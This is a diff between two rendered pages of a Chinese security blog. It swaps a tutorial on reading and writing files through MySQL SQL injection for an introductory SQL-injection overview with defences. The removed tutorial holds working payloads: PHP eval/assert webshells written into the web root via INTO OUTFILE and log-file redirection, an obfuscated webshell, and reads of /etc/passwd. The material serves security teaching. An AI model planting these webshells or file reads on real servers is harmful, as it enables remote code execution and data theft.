@@ -1,17 +1,17 @@
 <!DOCTYPE html>
 <html lang="en-uk" dir="ltr">
     <head><meta charset='utf-8'>
-<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content=''><title>SQL注入：文件读写</title>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='SQL注入：基础 简单来说，SQL注入就是attackers通过对客户端发出的HTTP请求的修改，在服务端执行他们想要的SQL操作。 （本篇用于'><title>SQL注入：基础</title>
 
-<link rel='canonical' href='https://ginkgo.org.cn/posts/sql_injection_file_rw/'>
+<link rel='canonical' href='https://ginkgo.org.cn/posts/sql_injection_basic/'>
 
-<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='SQL注入：文件读写'>
-<meta property='og:description' content=''>
-<meta property='og:url' content='https://ginkgo.org.cn/posts/sql_injection_file_rw/'>
+<link rel="stylesheet" href="/scss/style.min.450926226e724574a6b936335ea06111f8aeb253d932c86cb2cc807341cd2889.css"><meta property='og:title' content='SQL注入：基础'>
+<meta property='og:description' content='SQL注入：基础 简单来说，SQL注入就是attackers通过对客户端发出的HTTP请求的修改，在服务端执行他们想要的SQL操作。 （本篇用于'>
+<meta property='og:url' content='https://ginkgo.org.cn/posts/sql_injection_basic/'>
 <meta property='og:site_name' content='Under The Ginkgo'>
-<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='sqli' /><meta property='article:tag' content='security' /><meta property='article:tag' content='php' /><meta property='article:published_time' content='2022-04-02T00:00:00&#43;01:00'/><meta property='article:modified_time' content='2022-04-11T22:24:25&#43;01:00'/>
-<meta name="twitter:title" content="SQL注入：文件读写">
-<meta name="twitter:description" content="">
+<meta property='og:type' content='article'><meta property='article:section' content='Posts' /><meta property='article:tag' content='sqli' /><meta property='article:published_time' content='2022-04-24T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-04-24T22:59:23&#43;01:00'/>
+<meta name="twitter:title" content="SQL注入：基础">
+<meta name="twitter:description" content="SQL注入：基础 简单来说，SQL注入就是attackers通过对客户端发出的HTTP请求的修改，在服务端执行他们想要的SQL操作。 （本篇用于">
     <link rel="shortcut icon" href="/img/favicon.ico" />
 
 <script async src="https://www.googletagmanager.com/gtag/js?id=G-ZKEXSTS2N4"></script>
@@ -227,7 +227,7 @@ if (!doNotTrack) {
 
     <div class="article-title-wrapper">
         <h2 class="article-title">
-            <a href="/posts/sql_injection_file_rw/">SQL注入：文件读写</a>
+            <a href="/posts/sql_injection_basic/">SQL注入：基础</a>
         </h2>
     
         
@@ -246,7 +246,7 @@ if (!doNotTrack) {
   <path d="M3 11h16" />
   <path d="M18 16.496v1.504l1 1" />
 </svg>
-                <time class="article-time--published">Apr 02, 2022</time>
+                <time class="article-time--published">Apr 24, 2022</time>
             </div>
         
 
@@ -261,7 +261,7 @@ if (!doNotTrack) {
 
 
                 <time class="article-time--reading">
-                    3 minute read
+                    2 minute read
                 </time>
             </div>
         
@@ -275,104 +275,129 @@ if (!doNotTrack) {
     <section class="article-content">
     
     
-    <h2 id="sql注入-文件读写">SQL注入：文件读写</h2>
-<p>之前我们的基础注入包括盲注都依赖于HTTP请求的响应，并从其中获取查询结果，报错信息，页面变化，以及响应时间，而这次我们要讲的文件读写则是直接将需要的信息写入文件，或者从文件中读取信息。</p>
-<p>参考： <a class="link" href="https://xz.aliyun.com/t/7169#toc-33"  target="_blank" rel="noopener"
-    >https://xz.aliyun.com/t/7169#toc-33</a></p>
-<h3 id="前置知识">前置知识</h3>
-<p>说到文件读写，那就免不了要提到权限的问题。</p>
+    <h2 id="sql注入-基础">SQL注入：基础</h2>
+<p>简单来说，SQL注入就是attackers通过对客户端发出的HTTP请求的修改，在服务端执行他们想要的SQL操作。 <!-- raw HTML omitted --></p>
+<p>（本篇用于基础概念的归纳总结，可能不太适合新手学习） <!-- raw HTML omitted --></p>
+<h3 id="1-dot-sql注入产生的原因">1. SQL注入产生的原因</h3>
+<ol>
+<li>Missing or improper input validation (用户输入检查的缺乏或者不够完善) <!-- raw HTML omitted --></li>
+<li>Application-generated queries containing user-fed input (应用查询到的结果能够反馈用户之前的不恰当输入) <!-- raw HTML omitted --></li>
+</ol>
+<h3 id="2-dot-sql注入的注入点--sinks--和目标--targets">2. SQL注入的注入点(Sinks)和目标(targets)</h3>
+<h4 id="2-dot-1-sinks">2.1 Sinks</h4>
+<p>SQLi sinks 表示可能存在的注入点 <!-- raw HTML omitted --></p>
 <ul>
+<li><code>GET/POST parameters</code> <!-- raw HTML omitted --></li>
+<li><code>Every HTTP header</code> <!-- raw HTML omitted --></li>
+<li><code>Cookies</code> <!-- raw HTML omitted --></li>
+<li><code>Database itself</code> <!-- raw HTML omitted --></li>
+</ul>
+<p>以上所有的这些内容，都可以轻松的被用户所修改，他们也都有可能被用于服务端的数据库查询操作中，因此都需要严肃对待 <!-- raw HTML omitted --></p>
+<h4 id="2-dot-2-targets">2.2 Targets</h4>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Target</th>
+<th>Description</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>识别可注入的变量</td>
+<td>查找注入点（以上全是）</td>
+</tr>
+<tr>
+<td>数据库信息</td>
+<td>什么数据库？什么版本的数据库</td>
+</tr>
+<tr>
+<td>数据库结构</td>
+<td>库名，表名，列名，列类型，读写权限等</td>
+</tr>
+<tr>
+<td>获取数据</td>
+<td>爆库</td>
+</tr>
+<tr>
+<td>数据修改</td>
+<td>insert, update, delete操作</td>
+</tr>
+<tr>
+<td>DOS</td>
+<td>LOCK，DELETE 操作来破坏数据库的Availability阻止用户正常访问应用</td>
+</tr>
+<tr>
+<td>绕过验证</td>
+<td>绕过登陆注册等一系列检查</td>
+</tr>
+<tr>
+<td>远程指令注入</td>
+<td>远程控制数据库</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="3-dot-注入的技巧">3. 注入的技巧</h3>
+<ol>
 <li>
-<p><code>file_priv</code> 是用户读写文件的权限，可以通过以下payload来查询权限</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">file_priv</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="k">user</span><span class="w"> </span><span class="k">where</span><span class="w"> </span><span class="k">user</span><span class="o">=</span><span class="err">$</span><span class="k">USER</span><span class="w"> </span><span class="k">host</span><span class="o">=</span><span class="err">$</span><span class="k">HOST</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><figure><img src="/ox-hugo/2022-04-11_22-24-18_screenshot.png" width="400px"/>
-</figure>
+<p>判断注入点
+: 输入的内容，能否让页面产生异常的行为 <!-- raw HTML omitted --></p>
+<ul>
+<li>SQL报错信息 <!-- raw HTML omitted --></li>
+<li>页面内容的非正常显示 (e.g. 没有内容显示) <!-- raw HTML omitted --></li>
+<li>页面相应时间变化 <!-- raw HTML omitted --></li>
+</ul>
+</li>
+<li>
+<p>闭合异常
+: 如果说第一步的目的是为了让服务端的SQL查询语句出错，那么第二步就是为了在此基础上让SQL语句可以再次被正常解析 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>判断注入的类型
+: 尝试不同类型的注入payload，观察存在哪种注入 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>修改SQL语句语义
+: 修改语义，让数据库执行我们想要的操作 <!-- raw HTML omitted --></p>
+</li>
+<li>
+<p>获取数据
+: 爆库获得数据 <!-- raw HTML omitted --></p>
+</li>
+</ol>
+<p>这些操作也就对应了SQL注入的三要素: <!-- raw HTML omitted --></p>
+<ol>
+<li>所有HTTP请求的内容是否进行了严格的校验 <!-- raw HTML omitted --></li>
+<li>是否可以重新闭合注入点的语句错误，使其可以被重新正常解析 <!-- raw HTML omitted --></li>
+<li>语句是否可以被恶意修改 <!-- raw HTML omitted --></li>
+</ol>
+<h3 id="4-dot-sql注入对于安全的影响--cia">4. SQL注入对于安全的影响(CIA)</h3>
+<dl>
+<dt>Confidentiality</dt>
+<dd><ul>
+<li>查看其他人的隐私信息 <!-- raw HTML omitted --></li>
+<li>无授权地访问他人的账号 <!-- raw HTML omitted --></li>
+</ul>
+</dd>
+<dt>Integrity</dt>
+<dd>修改数据库的数据：工资，成绩等 <!-- raw HTML omitted --></dd>
+<dt>Availabity</dt>
+<dd><ul>
+<li>删库跑路 <!-- raw HTML omitted --></li>
+<li>修改账户信息：密码 <!-- raw HTML omitted --></li>
+<li>删除日志 <!-- raw HTML omitted --></li>
+</ul>
+</dd>
+</dl>
+<h3 id="5-dot-如何防御sql注入">5. 如何防御SQL注入</h3>
+<dl>
+<dt>i. 使用预编译语句</dt>
+<dd>顾名思义，就是将SQL语句提前编译，即其最终要执行的操作已经定了，唯一缺少的就是参数，其语义不会再受影响，这也是防御SQL注入的最佳手段 <!-- raw HTML omitted --></dd>
+<dt>ii. 检查数据类型</dt>
+<dd>对于所需要的参数进行严格的类型/格式检查，可以从很大程度上防御SQL注入 (数据类型，邮箱格式，日期格式等) <!-- raw HTML omitted --></dd>
+<dt>iii. 使用安全函数</dt>
+<dd>随着安全得到越来越多的重视，编程语言也在不断更新更为安全的函数和机制用于抵御一些常见的攻击 <!-- raw HTML omitted --></dd>
+</dl>
 
-</li>
-<li>
-<p><code>secure-file-priv</code> 是系统变量，用以对文件读写功能进行限制：</p>
-<ul>
-<li>为空，表示无限制</li>
-<li>为NULL，表示禁止文件读写</li>
-<li>为目录名，表示将文件读写限制在特定目录下</li>
-</ul>
-</li>
-</ul>
-<p>注：5.5.53本身及之后的版本默认值为NULL，之前的版本为空</p>
-<p>查看 <code>secure-file-priv</code> 值的方法</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="n">secure_file_priv</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">@@</span><span class="k">global</span><span class="p">.</span><span class="n">secure_file_priv</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">show</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s2">&#34;secure_file_priv&#34;</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><p>secure_file_priv= (空格）代表对文件读写没有限制
-secure_file_priv=NULL 代表不能进行文件读写
-secure_file_priv=d:/… (具体路径) 代表只能对改路径下文件进行读写</p>
-<p>修改的方法
-:</p>
-<p>通过修改my.ini文件，添加： <code>secure-file-priv=</code></p>
-<p>启动项添加参数： <code>mysqld.exe --secure-file-priv=</code></p>
-<h3 id="写">写</h3>
-<p>一般的利用就是将一句话木马注入到服务端，然后再用蚁剑等工具连接</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="s2">&#34;&lt;?php @eval($_POST[&#39;t&#39;]);?&gt;&#34;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">outfile</span><span class="w"> </span><span class="s1">&#39;/var/www/html/1.php&#39;</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="mi">2</span><span class="p">,</span><span class="s2">&#34;&lt;?php @assert($_POST[&#39;t&#39;]);?&gt;&#34;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="n">dumpfile</span><span class="w"> </span><span class="s1">&#39;/var/www/html/1.php&#39;</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><dl>
-<dt>需要满足的条件</dt>
-<dd><ul>
-<li><code>secure-file-priv</code> 为空或为可以利用的目录</li>
-<li>需要目标文件的绝对路径</li>
-<li>目标目录的权限为可写，mysql的权限也足够</li>
-</ul>
-</dd>
-</dl>
-<h4 id="日志法">日志法</h4>
-<p><a class="link" href="http://www.mi1k7ea.com/2020/07/19/SQL%E8%AF%AD%E5%8F%A5%E5%88%A9%E7%94%A8%E6%97%A5%E5%BF%97%E5%86%99shell%E5%8F%8A%E7%9B%B8%E5%85%B3%E7%BB%95%E8%BF%87/"  target="_blank" rel="noopener"
-    >参考</a>
-由于在mysql的5.5.53版本之后， <code>secure-file-priv</code> 的值默认为 <code>NULL</code> (NULL不等于空)，不满足我们所需要的条件，无法进行正常的读写。
-这里我们通过更改日志文件的方法来进行绕过</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">show</span><span class="w"> </span><span class="n">variables</span><span class="w"> </span><span class="k">like</span><span class="w"> </span><span class="s1">&#39;%general%&#39;</span><span class="p">;</span><span class="w">  </span><span class="o">#</span><span class="err">查看配置</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">general_log</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">on</span><span class="p">;</span><span class="w">  </span><span class="o">#</span><span class="err">开启</span><span class="k">general</span><span class="w"> </span><span class="n">log模式</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">general_log_file</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;/var/www/html/1.php&#39;</span><span class="p">;</span><span class="w">   </span><span class="o">#</span><span class="err">设置日志目录为</span><span class="n">shell地址</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="s1">&#39;&lt;?php eval($_POST[cmd]);?&gt;&#39;</span><span class="w">  </span><span class="o">#</span><span class="err">写入</span><span class="n">shell</span><span class="w">
-</span></span></span></code></pre></div><p>SQL查询免杀shell</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">SELECT</span><span class="w"> </span><span class="s2">&#34;&lt;?php $p = array(&#39;f&#39;=&gt;&#39;a&#39;,&#39;pffff&#39;=&gt;&#39;s&#39;,&#39;e&#39;=&gt;&#39;fffff&#39;,&#39;lfaaaa&#39;=&gt;&#39;r&#39;,&#39;nnnnn&#39;=&gt;&#39;t&#39;);$a = array_keys($p);$_=$p[&#39;pffff&#39;].$p[&#39;pffff&#39;].$a[2];$_= &#39;a&#39;.$_.&#39;rt&#39;;$_(base64_decode($_REQUEST[&#39;username&#39;]));?&gt;&#34;</span><span class="w">
-</span></span></span></code></pre></div><p>慢查询日志</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">slow_query_log_file</span><span class="o">=</span><span class="s1">&#39;/var/www/html/2.php&#39;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">mysql</span><span class="o">&gt;</span><span class="w"> </span><span class="k">set</span><span class="w"> </span><span class="k">global</span><span class="w"> </span><span class="n">slow_query_log</span><span class="o">=</span><span class="mi">1</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><dl>
-<dt>需要满足的条件</dt>
-<dd><ul>
-<li>需要进行日志设置操作的权限</li>
-<li>需要目标文件的绝对路径</li>
-</ul>
-</dd>
-</dl>
-<h3 id="读">读</h3>
-<p><a class="link" href="https://paper.seebug.org/1112/"  target="_blank" rel="noopener"
-    >https://paper.seebug.org/1112/</a>
-Mysql内置了用于读取文件的函数：</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">select</span><span class="w"> </span><span class="n">load_file</span><span class="p">(</span><span class="n">file_path</span><span class="p">);</span><span class="w">
-</span></span></span></code></pre></div><p>读取服务端文件，Mysql server读取服务端的 <code>/etc/passwd/</code> 文件，然后将数据按照 <code>'\n'</code> 分割 插入test表中，但是受到 <code>secure_file_priv</code> 的限制</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">load</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="n">infile</span><span class="w"> </span><span class="s2">&#34;/etc/passwd&#34;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">FIELDS</span><span class="w"> </span><span class="n">TERMINATED</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="s1">&#39;\n&#39;</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><p>读取客户端文件，读取客户端的文件，然后发送到客户端</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">load</span><span class="w"> </span><span class="k">data</span><span class="w"> </span><span class="k">local</span><span class="w"> </span><span class="n">infile</span><span class="w"> </span><span class="s2">&#34;/etc/passwd&#34;</span><span class="w"> </span><span class="k">into</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">test</span><span class="w"> </span><span class="n">FIELDS</span><span class="w"> </span><span class="n">TERMINATED</span><span class="w"> </span><span class="k">BY</span><span class="w"> </span><span class="s1">&#39;\n&#39;</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div><dl>
-<dt>条件</dt>
-<dd><ul>
-<li>读取服务端文件都需要 <code>secure-file-priv</code> 为空或者为可利用的目录</li>
-<li>需要知道读取文件所在的绝对路径</li>
-<li>读取的文件大小必须小于 <code>max_allowed_packet</code> 所设置的值</li>
-</ul>
-</dd>
-</dl>
-<h4 id="低权限读取文件的方法">低权限读取文件的方法</h4>
-<p>我们在前置知识中提到了5.5.53版本之后， <code>secure-file-priv</code> 默认为 <code>NULL</code> 这里给出方法，参考文章提到mysql8测试失败，其他版本自测</p>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-sql" data-lang="sql"><span class="line"><span class="cl"><span class="k">drop</span><span class="w"> </span><span class="k">table</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="n">m1</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">CREATE</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="n">m1</span><span class="w"> </span><span class="p">(</span><span class="n">code</span><span class="w"> </span><span class="nb">TEXT</span><span class="w"> </span><span class="p">);</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">LOAD</span><span class="w"> </span><span class="k">DATA</span><span class="w"> </span><span class="k">LOCAL</span><span class="w"> </span><span class="n">INFILE</span><span class="w"> </span><span class="s1">&#39;D://1.txt&#39;</span><span class="w"> </span><span class="k">INTO</span><span class="w"> </span><span class="k">TABLE</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="n">m1</span><span class="w"> </span><span class="n">fields</span><span class="w"> </span><span class="n">terminated</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span><span class="w">
-</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="k">select</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="k">from</span><span class="w"> </span><span class="n">mysql</span><span class="p">.</span><span class="n">m1</span><span class="p">;</span><span class="w">
-</span></span></span></code></pre></div>
 </section>
 
 
@@ -381,10 +406,6 @@ Mysql内置了用于读取文件的函数：</p>
     <section class="article-tags">
         
             <a href="/tags/sqli/">sqli</a>
-        
-            <a href="/tags/security/">security</a>
-        
-            <a href="/tags/php/">php</a>
         
     </section>
 
@@ -411,7 +432,7 @@ Mysql内置了用于读取文件的函数：</p>
 
 
         <span>
-            Last updated on Apr 11, 2022 22:24 BST
+            Last updated on Apr 24, 2022 22:59 BST
         </span>
     </section></footer>
 
@@ -453,12 +474,12 @@ Mysql内置了用于读取文件的函数：</p>
             
                 
 <article class="">
-    <a href="/posts/sql_injection_basic/">
+    <a href="/posts/sql_injection_file_rw/">
         
         
 
         <div class="article-details">
-            <h2 class="article-title">SQL注入：基础</h2>
+            <h2 class="article-title">SQL注入：文件读写</h2>
         </div>
     </a>
 </article>
@@ -631,19 +652,18 @@ Mysql内置了用于读取文件的函数：</p>
         <div class="widget--toc">
             <nav id="TableOfContents">
   <ul>
-    <li><a href="#sql注入-文件读写">SQL注入：文件读写</a>
+    <li><a href="#sql注入-基础">SQL注入：基础</a>
       <ul>
-        <li><a href="#前置知识">前置知识</a></li>
-        <li><a href="#写">写</a>
+        <li><a href="#1-dot-sql注入产生的原因">1. SQL注入产生的原因</a></li>
+        <li><a href="#2-dot-sql注入的注入点--sinks--和目标--targets">2. SQL注入的注入点(Sinks)和目标(targets)</a>
           <ul>
-            <li><a href="#日志法">日志法</a></li>
+            <li><a href="#2-dot-1-sinks">2.1 Sinks</a></li>
+            <li><a href="#2-dot-2-targets">2.2 Targets</a></li>
           </ul>
         </li>
-        <li><a href="#读">读</a>
-          <ul>
-            <li><a href="#低权限读取文件的方法">低权限读取文件的方法</a></li>
-          </ul>
-        </li>
+        <li><a href="#3-dot-注入的技巧">3. 注入的技巧</a></li>
+        <li><a href="#4-dot-sql注入对于安全的影响--cia">4. SQL注入对于安全的影响(CIA)</a></li>
+        <li><a href="#5-dot-如何防御sql注入">5. 如何防御SQL注入</a></li>
       </ul>
     </li>
   </ul>
